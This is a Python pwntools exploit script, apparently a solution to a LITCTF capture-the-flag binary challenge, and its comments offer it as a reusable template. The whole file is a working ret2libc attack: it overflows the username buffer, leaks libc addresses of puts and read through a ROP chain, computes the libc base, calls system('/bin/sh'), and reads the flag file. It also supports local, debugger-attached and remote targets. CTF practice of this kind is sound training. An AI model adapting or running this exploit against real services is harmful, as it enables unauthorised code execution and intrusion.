#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("main_patched")
libc = ELF("./libc6_2.39-0ubuntu8.4_amd64.so")

context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main+211; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
username = b'LITCTF\x00' + cyclic(33)
password = b'd0nt_57r1ngs_m3_3b775884'
pop_rdi = p64(0x0000000000401323)

def leak_address(to_leak):
    payload = b''.join([
        username,
        pop_rdi, p64(to_leak),
        p64(exe.sym['puts']),
        p64(exe.sym['main'])
        ])
    io.sendlineafter(b'Enter username:', payload)
    io.sendlineafter(b'Enter password:', password)
    io.recvuntil(b'Goodbye\n')
    leak = io.recvline()[:-1].ljust(8, b'\x00')
    return u64(leak)


libc_puts = leak_address(exe.got['puts'])
libc_read = leak_address(exe.got['read'])


success(f"libc puts @ {hex(libc_puts)}")
success(f"libc read @ {hex(libc_read)}")

libc.address = libc_puts - libc.sym['puts']
binsh = p64(libc.address + 0x1cb42f)
ret = p64(0x000000000040101a)

payload = b''.join([
    username,
    pop_rdi, binsh,
    ret,
    p64(libc.sym['system']),
    ])
io.sendlineafter(b'Enter username:', payload)
io.sendlineafter(b'Enter password:', password)


io.sendline(b"cat flag.txt")
flag = io.recvregex(rb'LITCTF\{.*\}', capture=True)
success(flag.group(0).decode())

io.close()
 